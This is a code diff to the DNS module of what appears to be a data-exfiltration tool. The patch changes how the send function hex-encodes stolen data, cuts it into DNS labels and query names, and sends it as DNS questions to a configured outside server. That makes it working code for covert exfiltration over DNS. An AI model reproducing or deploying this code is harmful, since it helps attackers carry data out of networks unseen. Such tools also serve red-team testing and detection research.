@@ -42,17 +42,29 @@ def handle_dns_packet(x):
         # print e
         pass
 
+def insertDot(mystring, position):
+    longi = len(mystring)
+    mystring   =  mystring[:position] + '.' + mystring[position:] 
+    return mystring  
 
 def send(data):
+    # Init Variables
+    label_len = 63
+    query_len = 252
+    label_count = config['key'].count('.')
+    # Send function
+    print data
     target = config['target']
     port = config['port']
     jobid = data.split("|!|")[0]
-    print data
     data = data.encode('hex')
     while data != "":
-        tmp = data[:66 - len(config['key']) - len(jobid)]
+        tmp = data[:query_len - len(config['key']) - len(jobid) - (query_len/label_len)]
         data = data.replace(tmp, '')
+        for i in [x for x in xrange(len(tmp)) if x%label_len == 0]:
+            tmp = insertDot(tmp, i)
         domain = "{0}{1}.{2}".format(jobid, tmp, config['key'])
+        print len(domain)
         app_exfiltrate.log_message(
             'info', "[dns] Sending {0} to {1}".format(domain, target))
         q = DNSRecord.question(domain)
